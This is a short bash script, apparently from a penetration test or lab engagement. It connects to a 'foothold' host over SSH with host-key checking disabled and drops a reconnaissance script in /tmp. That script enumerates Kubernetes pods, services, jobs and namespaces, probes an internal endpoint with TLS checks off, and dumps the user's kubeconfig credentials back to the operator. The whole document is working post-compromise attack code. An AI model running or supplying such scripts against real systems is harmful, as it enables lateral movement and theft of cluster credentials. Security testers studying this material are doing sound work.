#!/bin/bash
S="ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i ~/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180"
$S 'cat > /tmp/b5.sh' <<'EOS'
#!/bin/bash
C="curl -sS -k --max-time 15"
echo "### workloads well-known"; $C https://workloads.keplerops.test/.well-known/fieldkest-client; echo
echo "### kubectl pods"; kubectl get pods,svc,deploy,ingress,jobs,cronjobs -n fieldlink 2>&1 | head -60
echo "### kubectl all namespaces (if allowed)"; kubectl get ns 2>&1 | head -20
echo "### kubeconfig"; sed -n '1,60p' ~/.kube/config 2>/dev/null
EOS
chmod +x /tmp/b5.sh
$S 'bash /tmp/b5.sh' 2>&1 | head -150
